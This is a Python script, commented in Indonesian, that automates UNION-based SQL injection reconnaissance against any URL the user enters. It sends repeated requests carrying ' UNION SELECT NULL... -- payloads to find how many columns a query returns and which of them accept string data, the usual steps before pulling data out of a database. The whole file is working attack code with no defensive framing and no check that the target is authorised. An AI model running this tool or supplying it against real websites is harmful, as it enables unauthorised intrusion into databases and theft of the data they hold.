import requests

def tipeDataKolom():
    print("PENDETEKSI TIPE DATA KOLOM")
    url = input('masukkan URL di sini: ')
    jumlah_kolom = int(input("\nada berapa kolom?\n: "))
    pembuka = "' UNION SELECT "
    payload = ["NULL"] * jumlah_kolom
    tutup = " --"
    torg = int(input("kutip tunggal atau ganda?\n1. tunggal\n2. ganda\n: "))
    
    for i in range(jumlah_kolom):
        tunggal = payload.copy()
        ganda = payload.copy()
        ganda[i] = "\"str\""
        tunggal[i] = "\'str\'"
        
        if torg == 1:
            hasil_payload = ", ".join(tunggal)
            
            union = f"{url}{pembuka}{hasil_payload}{tutup}"
            
            response = requests.get(union)
            code = response.status_code
            
            print(union)
            print(code)
        elif torg == 2:
            hasil_payload = ", ".join(ganda)
            
            union = f"{url}{pembuka}{hasil_payload}{tutup}"
            
            response = requests.get(union)
            code = response.status_code
            
            print(union)
            print(code)
    

def jumlahKolomUnion():
    print("PENDETEKSI JUMLAH KOLOM\n")
    url = input('masukkan URL di sini: ')
    pembuka = "' UNION SELECT NULL"
    payload = ", NULL"
    tutup = " --"

    jumlahPayload = 0

    if "http" in url:
        while True:
            union = url + pembuka + (payload * jumlahPayload) + tutup
            response = requests.get(union)
            jumlahPayload += 1

            code = response.status_code
            jumlahKolom = (jumlahPayload)

            panjang = len(response.text)

            print("=" * 150)

            print("URL: ", union)
            print("length: ", panjang)
            print('status: ', code)
            print('Jumlah kolom: ', jumlahKolom)

            print("=" * 150)

            if code == 200:
                break
    else:
        http = "http://"
        https = "https://"
        print('\n1. http\n2. https\n')

        protocol = int(input("pilih salah satu\n: "))
        if protocol == 1:
            while True:
                union = http + url + pembuka + (payload * jumlahPayload) + tutup
                response = requests.get(union)
                jumlahPayload += 1
            
                code = response.status_code
                jumlahKolom = (jumlahPayload)
            
                panjang = len(response.text)
            
                print("=" * 150)
            
                print("URL: ", union)
                print("length: ", panjang)
                print('status: ', code)
                print('Jumlah kolom: ', jumlahKolom)
            
                print("=" * 150)

                if code == 200:
                    break
        elif protocol == 2:
            while True:
                union = https + url + pembuka + (payload * jumlahPayload) + tutup
                response = requests.get(union)
                jumlahPayload += 1
            
                code = response.status_code
                jumlahKolom = (jumlahPayload)
            
                panjang = len(response.text)
            
                print("=" * 150)
            
                print("URL: ", union)
                print("length: ", panjang)
                print('status: ', code)
                print('Jumlah kolom: ', jumlahKolom)
            
                print("=" * 150)
                if code == 200:
                    break